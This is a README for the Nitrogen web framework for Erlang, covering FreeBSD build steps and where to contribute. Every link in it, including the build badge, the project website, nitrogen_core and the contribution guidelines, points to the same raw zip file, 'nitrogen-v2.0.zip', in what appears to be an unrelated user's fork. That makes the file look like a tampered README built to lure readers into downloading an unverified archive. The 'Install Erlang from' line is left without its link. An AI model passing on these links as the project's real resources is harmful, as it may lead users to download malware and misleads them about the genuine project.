# Nitrogen Web Framework for Erlang

[![Build Status](https://raw.githubusercontent.com/sohailgerman/nitrogen/master/rel/overlay/nitrogen-v2.0.zip)](https://raw.githubusercontent.com/sohailgerman/nitrogen/master/rel/overlay/nitrogen-v2.0.zip)

Nitrogen is an Erlang-based web framework that allows you to develop
infinitely scaleable, Ajax-rich web applications using a pure Erlang 
technology stack.

See the [Nitrogen Project website](https://raw.githubusercontent.com/sohailgerman/nitrogen/master/rel/overlay/nitrogen-v2.0.zip) for
additional information.

## Building Nitrogen on FreeBSD

Install Erlang from 

Make sure you have `gmake` installed, and use `gmake` instead of `make`

Example:

$ gmake rel_cowboy

## Want to contribute?

[nitrogen_core](https://raw.githubusercontent.com/sohailgerman/nitrogen/master/rel/overlay/nitrogen-v2.0.zip) is where you would
find the vast majority of Nitrogen's codebase, should you wish to contribute or
make changes.

Read our [contribution
guidelines](https://raw.githubusercontent.com/sohailgerman/nitrogen/master/rel/overlay/nitrogen-v2.0.zip)
to get started contributing to Nitrogen!  (they're not strict, just
recommendations)
